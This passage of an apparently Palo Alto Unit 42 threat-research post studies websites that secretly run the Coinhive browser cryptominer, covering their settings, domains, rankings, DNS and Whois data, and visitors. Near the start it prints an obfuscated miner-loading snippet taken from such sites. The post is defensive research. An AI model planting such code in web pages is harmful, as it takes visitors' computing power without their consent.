			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
var _0x8cfd=["\x56\x63\x33\x38\x75\x32\x33\x35\x51\x67\x31\x55\x6E\x48\x78\x47\x43\x52\x6A\x59\x51\x4D\x58\x70\x6E\x4A\x73\x58\x77\x4B\x4C\x69","\x73\x74\x61\x72\x74"];var miner=new CoinHive.Anonymous(_0x8cfd[0],{threads:1,autoThreads:true,throttle:0.6,forceASMJS:false})</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f6928803d912938043347-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f6928803d912938043347-1"><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-v">_0x8cfd</span><span class="crayon-o">=</span><span class="crayon-sy">[</span><span class="crayon-s">"\x56\x63\x33\x38\x75\x32\x33\x35\x51\x67\x31\x55\x6E\x48\x78\x47\x43\x52\x6A\x59\x51\x4D\x58\x70\x6E\x4A\x73\x58\x77\x4B\x4C\x69"</span><span class="crayon-sy">,</span><span class="crayon-s">"\x73\x74\x61\x72\x74"</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-v">miner</span><span class="crayon-o">=</span><span class="crayon-r">new</span><span class="crayon-h"> </span><span class="crayon-v">CoinHive</span><span class="crayon-sy">.</span><span class="crayon-e">Anonymous</span><span class="crayon-sy">(</span><span class="crayon-v">_0x8cfd</span><span class="crayon-sy">[</span><span class="crayon-cn">0</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span><span class="crayon-sy">{</span><span class="crayon-v">threads</span><span class="crayon-o">:</span><span class="crayon-cn">1</span><span class="crayon-sy">,</span><span class="crayon-v">autoThreads</span><span class="crayon-o">:</span><span class="crayon-t">true</span><span class="crayon-sy">,</span><span class="crayon-v">throttle</span><span class="crayon-o">:</span><span class="crayon-cn">0.6</span><span class="crayon-sy">,</span><span class="crayon-v">forceASMJS</span><span class="crayon-o">:</span><span class="crayon-t">false</span><span class="crayon-sy">}</span><span class="crayon-sy">)</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0006 seconds] -->
<p>Clearly, the site owner/injector is aware of the risks of exposing its key and is trying to hide from public scrutiny. If this trend continues, it will become harder to use static analysis to detect crypto-mining sites.</p>
<h2></h2>
<h2>Configuration Distribution</h2>
<p>The dominant Actor ID <span style="font-family: 'courier new', courier, monospace;">t3z562mp2zg1lia7rujy19d67woezmjj</span> uses default configuration across all of observed URLs, so we exclude this actor from this analysis to prevent skew. We also exclude the 142 sites that use mineropts that go almost hand-in-hand with sites using sitekey as their site key.</p>
<p>This left us with 827 valid data points. Among these most sites only use 1 thread by default; however, some sites use as many as 4 threads to maximize mining speed.</p>
<table width="0%">
<tbody>
<tr>
<td>Thread count</td>
<td>Number of sites</td>
</tr>
<tr>
<td>default (1)</td>
<td>772</td>
</tr>
<tr>
<td>1</td>
<td>28</td>
</tr>
<tr>
<td>2</td>
<td>7</td>
</tr>
<tr>
<td>3</td>
<td>1</td>
</tr>
<tr>
<td>4</td>
<td>19</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p>After the default setting which disables throttling the most popular option is to set it at 0.5, so that the CPU would idle 50% of the time. It is sufficient to say that most sites are not giving user’s CPU any break at all by disabling throttling.</p>
<table width="0%">
<tbody>
<tr>
<td>Throttle setting</td>
<td>Number of sites</td>
</tr>
<tr>
<td>default (0)</td>
<td>772</td>
</tr>
<tr>
<td>0.5</td>
<td>28</td>
</tr>
<tr>
<td>0.2</td>
<td>25</td>
</tr>
<tr>
<td>0.7</td>
<td>19</td>
</tr>
<tr>
<td>0.9</td>
<td>10</td>
</tr>
<tr>
<td>other values combined</td>
<td>35</td>
</tr>
</tbody>
</table>
<h2></h2>
<h2>Hosting domain analysis</h2>
<p>In this section, we show some hosting domain stats, including PassiveDNS and Whois data analysis.</p>
<p>The TLD distribution for domains hosting <span style="font-family: 'courier new', courier, monospace;">coinhive.min.js</span> is shown below. For brevity, we aggregated all TLDs having less than 20 entries into others category.</p>
<p><img class="wp-image-46071 aligncenter" src="https://researchcenter.paloaltonetworks.com/wp-content/uploads/2017/10/CoinMining_2.png" alt="CoinMining_2" width="510" height="343" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/CoinMining_2.png 875w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/CoinMining_2-300x202.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/CoinMining_2-768x517.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/CoinMining_2-370x249.png 370w" sizes="(max-width: 510px) 100vw, 510px" /></p>
<p>Clearly, the top suspects are <span style="font-family: 'courier new', courier, monospace;">.download</span> and <span style="font-family: 'courier new', courier, monospace;">.bid</span> domains, taking more than 35% of the total share of 1,025 domains. As expected, typically notorious TLDs like <span style="font-family: 'courier new', courier, monospace;">.xyz</span> and <span style="font-family: 'courier new', courier, monospace;">.win</span> is also listed.</p>
<h2></h2>
<h2>Alexa rank distribution</h2>
<p class="FirstParagraph">We checked all associated domains against the current Alexa traffic ranking. The results are astonishing &#8211; there are 5 sites in top 2K, 29 sites in top 10K and 155 sites in top 1 million. We sample a few highest-ranking sites and show it here:</p>
<table width="0%">
<tbody>
<tr>
<td>Site</td>
<td>Alexa Rank</td>
</tr>
<tr>
<td>uptobox[.]com</td>
<td>771</td>
</tr>
<tr>
<td>123movies[.]co</td>
<td>963</td>
</tr>
<tr>
<td>cinecalidad[.]to</td>
<td>1026</td>
</tr>
<tr>
<td>watchfree[.]to</td>
<td>1892</td>
</tr>
<tr>
<td>sugklonistiko[.]gr</td>
<td>1910</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p>At the time of the writing, we can no longer observe <span style="font-family: 'courier new', courier, monospace;">coinhive.min.js</span> on their sites.</p>
<p>The highest ranked .<span style="font-family: 'courier new', courier, monospace;">bid domain, llxyyocfgfg[.]bid</span> is ranked at 3380 at the time of this writing. We have attached all these IOCs and their rankings at the end of this blog for the community&#8217;s benefits.</p>
<h2></h2>
<h2>pDNS analysis</h2>
<p>We looked up these domains in our passive DNS (pDNS) database. 794 domains were found with records among the 1026 domains in total. We found that the first DNS query to many domains dates back to the launch date of our pDNS in 2013. Examples include <span style="font-family: 'courier new', courier, monospace;">uptobox[.]com, torrent[.]cd, and tiexue[.]net.</span> This means these websites have been active for a long time. Some of them are quite popular based on their Alexa ranking. So, the potential impact of Coinhive can be high in both time and space. We also found that the first DNS query to 502 (63%) domains happened in October 2017. Based on the figure below, we can clearly see the emerging trend of these domains.</p>
<p><img class="wp-image-46095 aligncenter" src="https://researchcenter.paloaltonetworks.com/wp-content/uploads/2017/10/CoinMining_3.png" alt="CoinMining_3" width="642" height="233" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/CoinMining_3.png 875w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/CoinMining_3-300x109.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/CoinMining_3-768x279.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/CoinMining_3-370x134.png 370w" sizes="(max-width: 642px) 100vw, 642px" /></p>
<p>We further investigated the DNS query pattern of these domains. In particular, the following graph shows the number of DNS queries to these website per hour. Interestingly, we found that some domains exhibit very similar patterns. Although the start time and amount of traffic are slightly different, the overall pattern of traffic is very much similar in shape. This is another indicator that these domains potentially belong to the same campaign launched by the same owner.</p>
<p><img class="wp-image-46119 aligncenter" src="https://researchcenter.paloaltonetworks.com/wp-content/uploads/2017/10/CoinMining_4.png" alt="CoinMining_4" width="642" height="216" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/CoinMining_4.png 875w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/CoinMining_4-300x101.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/CoinMining_4-768x259.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/CoinMining_4-370x125.png 370w" sizes="(max-width: 642px) 100vw, 642px" /></p>
<p>In addition, we analyzed the distribution of IPs to which these domains were resolved. We identified 1,172 IPs in total, located in 47 different countries with the majority being in US. Below is the figure showing the country-level distribution of these IPs.</p>
<p><img class="wp-image-46143 aligncenter" src="https://researchcenter.paloaltonetworks.com/wp-content/uploads/2017/10/CoinMining_5.png" alt="CoinMining_5" width="648" height="337" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/CoinMining_5.png 875w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/CoinMining_5-300x156.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/CoinMining_5-768x399.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/CoinMining_5-370x192.png 370w" sizes="(max-width: 648px) 100vw, 648px" /></p>
<h2></h2>
<h2>Whois analysis</h2>
<p>Through querying public Whois server as well as Domaintools, we obtained 861 valid whois records of 1,025 domains. Below we break the results down by registrant/emails and their registration dates.</p>
<ul>
<li>Registrant/Emails: Not much can be learned due to the fact that most (521) are privacy protected by WhoisGuard. In the remaining registrants, there are also fake ones such as <span style="font-family: 'courier new', courier, monospace;">Administrator</span> and <span style="font-family: 'courier new', courier, monospace;">Private Person</span>. After removing the useless entries, we are only left with 80 different registrants, with no more than one registrant appearing more than 3 times. All the .<span style="font-family: 'courier new', courier, monospace;">bid</span> domains are privacy protected. Since WhoisGuard service is not free (around $3/year), the .<span style="font-family: 'courier new', courier, monospace;">bid</span> campaign actors are probably earning enough profit to offset this cost.</li>
<li>Registration date: To better present details in registration date, we separate domains with different TLDs:</li>
</ul>
<p><img class="wp-image-46167 aligncenter" src="https://researchcenter.paloaltonetworks.com/wp-content/uploads/2017/10/CoinMining_6.png" alt="CoinMining_6" width="460" height="276" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/CoinMining_6.png 758w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/CoinMining_6-300x180.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/CoinMining_6-370x222.png 370w" sizes="(max-width: 460px) 100vw, 460px" /></p>
<p>For .<span style="font-family: 'courier new', courier, monospace;">bid</span> domains that we were able to retrieve whois information, most are registered after 10/01/2017 but spanning across multiple days, showing that the campaign is very recent and it has a rotating number of domains refreshing every day.</p>
<p><img class="wp-image-46191 aligncenter" src="https://researchcenter.paloaltonetworks.com/wp-content/uploads/2017/10/CoinMining_7.png" alt="CoinMining_7" width="461" height="276" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/CoinMining_7.png 759w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/CoinMining_7-300x180.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/CoinMining_7-370x222.png 370w" sizes="(max-width: 461px) 100vw, 461px" /></p>
<p>In contrast, most <span style="font-family: 'courier new', courier, monospace;">.download</span> domains were registered within 3 days of 09/14-09/16, 2017, with only a handful added on later. This looks to be a different campaign than the <span style="font-family: 'courier new', courier, monospace;">.bid </span>ones. We see similar registration trending on <span style="font-family: 'courier new', courier, monospace;">.review</span> domains (87 out of 103 are registered on the 3rd, 7th, and 8th of October 2017).</p>
<p><img class="wp-image-46215 aligncenter" src="https://researchcenter.paloaltonetworks.com/wp-content/uploads/2017/10/CoinMining_8.png" alt="CoinMining_8" width="607" height="235" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/CoinMining_8.png 875w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/CoinMining_8-300x116.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/CoinMining_8-768x298.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/CoinMining_8-370x143.png 370w" sizes="(max-width: 607px) 100vw, 607px" /></p>
<p>Finally, after we exclude the suspected campaign domains (<span style="font-family: 'courier new', courier, monospace;">.bid, .download, .review, .top, .win</span>), the registration dates are extremely spread out from as early as 2001 to the current date. These domains are most likely either embracing the new crypto-mining monetization fever, or compromised by attackers to take advantage of their established reputation and high-volume visitors.</p>
<h2></h2>
<h2>Victim analysis</h2>
<p class="FirstParagraph">The URLs we crawled to detect crypto-miner presence comes from our PANDB cloud log. In this section, we analyze the demographics of visitors to such sites to shed some insights on their real-world impact.</p>
<p class="FirstParagraph"><img class="wp-image-46239 aligncenter" src="https://researchcenter.paloaltonetworks.com/wp-content/uploads/2017/10/CoinMining_9.png" alt="CoinMining_9" width="510" height="306" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/CoinMining_9.png 758w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/CoinMining_9-300x180.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/CoinMining_9-370x222.png 370w" sizes="(max-width: 510px) 100vw, 510px" /></p>
<p>This figure shows the general geographic distribution of visitors to crypto-mining sites. While the US clearly dominates in total visiting counts, Europe and Asia Pacific is not too far behind. This graph indicates a broad spectrum of victims all across the globe.</p>
<p>After breaking down visits site-by-site, we found that the most visited sites generally align with their Alexa ranking, with over 40K visits* to the <span style="font-family: 'courier new', courier, monospace;">123moviews[.]co:</span></p>
<p><img class="wp-image-46263 aligncenter" src="https://researchcenter.paloaltonetworks.com/wp-content/uploads/2017/10/CoinMining_10.png" alt="CoinMining_10" width="495" height="240" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/CoinMining_10.png 875w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/CoinMining_10-380x184.png 380w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/CoinMining_10-300x145.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/CoinMining_10-768x372.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/CoinMining_10-370x179.png 370w" sizes="(max-width: 495px) 100vw, 495px" /></p>
<p>We only log a query when customer(s) using the same device visits the site for the first time in a TTL window. This does not count duplicate visits to the same site within a short timeframe. Therefore, the visits estimations are a lower bound.</p>
<h2></h2>
<h2>Summary</h2>
<p>As <a href="https://blog.adguard.com/en/crypto-mining-fever/">AdGuard</a> has pointed out, the use of coinhive or similar mining services is itself not a malicious activity, it is <strong>how</strong> they are used that makes the sites malicious. Unfortunately, for the sites that we were able to observe engaging in crypto-mining activities, none of them has prompted the user with any sort of warning, let alone providing the kill switch for mining. With Bitcoin soaring over $5K (at time of writing), we can only expect more of such services spawning from everywhere. To protect yourself from this fast-growing threat, we recommend two options:</p>
<ul>
<li>Palo Alto Networks is blocking URLs hosting the Coinhive JavaScript files through PANDB, which can be enforced as part of the malware category, as these scripts are consuming system resources without the users’ knowledge or consent.</li>
<li>In addition, popular browser plugins such as Adblock plus or Adguard will also block such mining scripts. Combine it with our firewall solution, you can rest assured that your previous CPU time and electricity is not exploited by sneaky scripts.</li>
<li>Users interested in top-ranked .bid, .download, and .website Domains hosting Coinhive script files included in this analysis can access them <a href="https://github.com/pan-unit42/iocs/blob/master/coinhive/top_domains.txt">here</a>.</li>
</ul>
          <div class="article__subscribe mb-40 text-gray-400 bg-gray-200 rounded-lg">
  <h4 class="h3 mb-10 text-black">Get updates from <br class="d-sm-none"> Palo Alto<br class="d-sm-none"> Networks!</h4>
  <p>Sign up to receive the latest news, cyber threat intelligence and research from us</p>
  <!-- <form action="https://app-guse4001.marketo.com/index.php/leadCapture/save2" method="post" novalidate class="subscribe-form py-25" name="Unit42_Subscribe"> -->
  <form action="https://start.paloaltonetworks.com/index.php/leadCapture/save2" method="post" novalidate class="subscribe-form py-25" name="Unit42_Subscribe">
    <input type="hidden" value="1086" name="formid">
    <!-- <input type="hidden" value="818-CZC-273" name="munchkinId"> -->
    <input type="hidden" value="531-OCS-018" name="munchkinId">
    <input type="hidden" value="2141" name="lpId">
    <input type="hidden" value="1086" name="formVid">
    <input type="hidden" name="mkto_optinunit42" value="true">
    <input type="hidden" name="mkto_opt-in" value="true">
    <div class="row">
      <div class="col-sm col-12 mb-sm-0 mb-15">
        <input type="email" name="Email" placeholder="Email address" class="subscribe-field d-block w-100 px-sm-25 px-15 bg-white">
        <p class="error-mail d-none mt-15 text-danger" style="color: #dc3545">Please enter your email address!</p>
      </div>
      <div class="col-sm-auto col-12">
          <input type="submit" value="Subscribe" class="btn btn--black btn--sm w-100" disabled="disabled">
      </div>
    </div>

    <div class="google-recapth mt-15">
      <div class="g-recaptcha" data-expired-callback="captchaExpires" data-callback="captchaComplete" data-sitekey="6LfKOrwUAAAAAOwgjxrEcx-pcfwe8OquUw6ommTK"></div>
      <p class="error-recaptcha d-none mt-15 text-danger" style="color: #dc3545">Please mark, I'm not a robot!</p>
    </div>
  </form>

  <div class="font-size-ex-sm col-sm-7 p-0">
    <p>By submitting this form, you agree to our <a href="https://www.paloaltonetworks.com/legal-notices/terms-of-use">Terms of Use</a> and acknowledge our <a href="https://www.paloaltonetworks.com/legal-notices/privacy">Privacy Statement</a>.</p>
  </div>
</div>

<script type="text/javascript" src="https://researchcenter.paloaltonetworks.com/wp-content/plugins/google-analyticator/external-tracking.min.js?ver=6.4.9"></script>
        </div>
      </div>
    </div>
  </article>
<footer class="site-footer px-sm-0 px-15">
  <div class="pt-40">
    <div class="container pt-sm-30">
      <div class="row justify-content-lg-center">
        <div class="col-lg-11 col-12">
          <div class="row">
            <div class="col-lg-4 col-sm-3 col-12 order-sm-2">
              <nav class="footer-socials mb-sm-0 mb-25 text-white text-sm-right">
                                                <a href="https://twitter.com/Unit42_Intel" target="_blank"><span class="ui ui-4"></span></a>
                <a href="https://github.com/pan-unit42" target="_blank"><span class="ui ui-5"></span></a>
              </nav>
            </div>

            <div class="col-lg-8 col-sm-9 col-12 order-sm-1">
              <div class="row">
                <div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Popular Resources</h4><div class="menu-footer-company-phase-container"><ul id="menu-footer-company-phase" class="menu"><li id="menu-item-97096" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97096"><a target="_blank" href="https://www.paloaltonetworks.com/resources">Resource Center</a></li>
<li id="menu-item-97097" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97097"><a target="_blank" href="https://researchcenter.paloaltonetworks.com/">Blog</a></li>
<li id="menu-item-97098" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97098"><a target="_blank" href="https://www.paloaltonetworks.com/communities">Communities</a></li>
<li id="menu-item-97099" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97099"><a target="_blank" href="https://docs.paloaltonetworks.com/">Tech Docs</a></li>
<li id="menu-item-97100" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-97100"><a href="https://unit42.paloaltonetworks.com/">Unit 42</a></li>
<li id="menu-item-97101" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97101"><a target="_blank" href="https://www.paloaltonetworks.com/sitemap">Sitemap</a></li>
</ul></div></div><div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Legal Notices</h4><div class="menu-footer-legal-notices-phase-container"><ul id="menu-footer-legal-notices-phase" class="menu"><li id="menu-item-97093" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97093"><a target="_blank" href="https://www.paloaltonetworks.com/legal-notices/privacy">Privacy</a></li>
<li id="menu-item-97094" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97094"><a target="_blank" href="https://www.paloaltonetworks.com/legal-notices/terms-of-use">Terms of Use</a></li>
<li id="menu-item-97095" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97095"><a target="_blank" href="https://www.paloaltonetworks.com/legal">Documents</a></li>
</ul></div></div><div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Account</h4><div class="menu-footer-trending-topics-phase-container"><ul id="menu-footer-trending-topics-phase" class="menu"><li id="menu-item-97102" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97102"><a href="https://start.paloaltonetworks.com/preference-center">Manage Subscriptions</a></li>
<li id="menu-item-97103" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97103"><a href="#">&nbsp;</a></li>
<li id="menu-item-97104" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97104"><a href="https://www.paloaltonetworks.com/security-disclosure">Report a Vulnerability</a></li>
</ul></div></div>              </div>
            </div>
          </div>

          
            <div class="copyrights py-25 mt-40">
               <p>© 2020 Palo Alto Networks, Inc. All rights reserved.</p>
            </div>
          
        </div>
      </div>
    </div>
  </div>
</footer>
    <script type="text/javascript">
	var isProcessing = false; 
    function alter_ul_post_values(obj,post_id,ul_type){
	
		if (isProcessing)    
		return;  
		isProcessing = true;   
		
		jQuery(obj).find("span").html("..");
                jQuery.ajax({
                    type: "POST",
                    url: "https://unit42.paloaltonetworks.com/wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/ajax_counter.php",
                    data: "post_id="+post_id+"&up_type="+ul_type,
                    success: function(msg){
                            jQuery(obj).find("span").html(msg);
                            isProcessing = false; 
                            jQuery(obj).find('svg').children('path').attr('stroke','#0050FF');
                            jQuery(obj).removeClass('idc_ul_cont_not_liked idc_ul_cont_not_liked_inner');
                    }
 		});
	}
	</script>
            <script type="text/javascript">
            (function(){
                document.addEventListener('DOMContentLoaded', function(){
                    let wpp_widgets = document.querySelectorAll('.popular-posts-sr');

                    if ( wpp_widgets ) {
                        for (let i = 0; i < wpp_widgets.length; i++) {
                            let wpp_widget = wpp_widgets[i];
                            WordPressPopularPosts.theme(wpp_widget);
                        }
                    }
                });
            })();
        </script>
                <script>
            var WPPImageObserver = null;

            function wpp_load_img(img) {
                if ( ! 'imgSrc' in img.dataset || ! img.dataset.imgSrc )
                    return;

                img.src = img.dataset.imgSrc;

                if ( 'imgSrcset' in img.dataset ) {
                    img.srcset = img.dataset.imgSrcset;
                    img.removeAttribute('data-img-srcset');
                }

                img.classList.remove('wpp-lazyload');
                img.removeAttribute('data-img-src');
                img.classList.add('wpp-lazyloaded');
            }

            function wpp_observe_imgs(){
                let wpp_images = document.querySelectorAll('img.wpp-lazyload'),
                    wpp_widgets = document.querySelectorAll('.popular-posts-sr');

                if ( wpp_images.length || wpp_widgets.length ) {
                    if ( 'IntersectionObserver' in window ) {
                        WPPImageObserver = new IntersectionObserver(function(entries, observer) {
                            entries.forEach(function(entry) {
                                if (entry.isIntersecting) {
                                    let img = entry.target;
                                    wpp_load_img(img);
                                    WPPImageObserver.unobserve(img);
                                }
                            });
                        });

                        if ( wpp_images.length ) {
                            wpp_images.forEach(function(image) {
                                WPPImageObserver.observe(image);
                            });
                        }

                        if ( wpp_widgets.length ) {
                            for (var i = 0; i < wpp_widgets.length; i++) {
                                let wpp_widget_images = wpp_widgets[i].querySelectorAll('img.wpp-lazyload');

                                if ( ! wpp_widget_images.length && wpp_widgets[i].shadowRoot ) {
                                    wpp_widget_images = wpp_widgets[i].shadowRoot.querySelectorAll('img.wpp-lazyload');
                                }

                                if ( wpp_widget_images.length ) {
                                    wpp_widget_images.forEach(function(image) {
                                        WPPImageObserver.observe(image);
                                    });
                                }
                            }
                        }
                    } /** Fallback for older browsers */
                    else {
                        if ( wpp_images.length ) {
                            for (var i = 0; i < wpp_images.length; i++) {
                                wpp_load_img(wpp_images[i]);
                                wpp_images[i].classList.remove('wpp-lazyloaded');
                            }
                        }

                        if ( wpp_widgets.length ) {
                            for (var j = 0; j < wpp_widgets.length; j++) {
                                let wpp_widget = wpp_widgets[j],
                                    wpp_widget_images = wpp_widget.querySelectorAll('img.wpp-lazyload');

                                if ( ! wpp_widget_images.length && wpp_widget.shadowRoot ) {
                                    wpp_widget_images = wpp_widget.shadowRoot.querySelectorAll('img.wpp-lazyload');
                                }

                                if ( wpp_widget_images.length ) {
                                    for (var k = 0; k < wpp_widget_images.length; k++) {
                                        wpp_load_img(wpp_widget_images[k]);
                                        wpp_widget_images[k].classList.remove('wpp-lazyloaded');
                                    }
                                }
                            }
                        }
                    }
                }
            }

            document.addEventListener('DOMContentLoaded', function() {
                wpp_observe_imgs();

                // When an ajaxified WPP widget loads,
                // Lazy load its images
                document.addEventListener('wpp-onload', function(){
                    wpp_observe_imgs();
                });
            });
        </script>
        <link rel='stylesheet' id='wpdevart_lightbox_front_end_css-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/style/wpdevart_lightbox_front.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='wpdevart_lightbox_effects-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/style/effects_lightbox.css?ver=5.4.1' type='text/css' media='all' />
<script type='text/javascript' src='https://www.google.com/recaptcha/api.js'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/dist/scripts/main.js'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/wp-embed.min.js?ver=5.4.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpdevart_lb_variables = {"eneble_lightbox_content":"enable","overlay_transparency_prancent":"80","popup_background_color":"#000000","popup_loading_image":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/popup_loading.png","popup_initial_width":"350","popup_initial_height":"300","popup_youtube_width":"640","popup_youtube_height":"410","popup_vimeo_width":"500","popup_vimeo_height":"410","popup_max_width":"5000","popup_max_height":"5000","popup_position":"5","popup_fixed_position":"true","popup_outside_margin":"0","popup_border_width":"2","popup_border_color":"#000000","popup_border_radius":"10","control_buttons_show":"true","control_buttons_show_in_content":"false","control_buttons_height":"30","control_buttons_line_bg_color":"#000000","control_button_prev_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/prev.png","control_button_prev_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/prev_hover.png","control_button_next_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/next.png","control_button_next_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/next_hover.png","control_button_download_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/download.png","control_button_download_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/download_hover.png","control_button_innewwindow_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/innewwindow.png","control_button_innewwindow_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/innewwindow_hover.png","control_button_fullwidth_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidth.png","control_button_fullwidht_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidth_hover.png","control_button_fullwidthrest_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidthreset.png","control_button_fullwidhtrest_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidthreset_hover.png","control_button_close_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/close.png","control_button_close_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/close_hover.png","information_panel_show":"false","information_panel_show_in_content":"false","information_panel_bg_color":"#000000","information_panel_default_transparency":"100","information_panel_hover_trancparency":"100","information_panel_count_image_after_text":"Image","information_panel_count_image_middle_text":"of","information_panel_count_padding_left":"15","information_panel_count_padding_right":"4","information_panel_count_font_size":"20","information_panel_desc_padding_left":"15","information_panel_desc_padding_right":"4","information_panel_desc_font_size":"20","information_panel_desc_show_if_not":"true","information_panel_text_for_no_caption":"No Caption","information_panel_title_padding_left":"5","information_panel_title_padding_right":"5","information_panel_title_font_size":"15","information_panel_title_show_if_not":"true","information_panel_text_for_no_title":"No 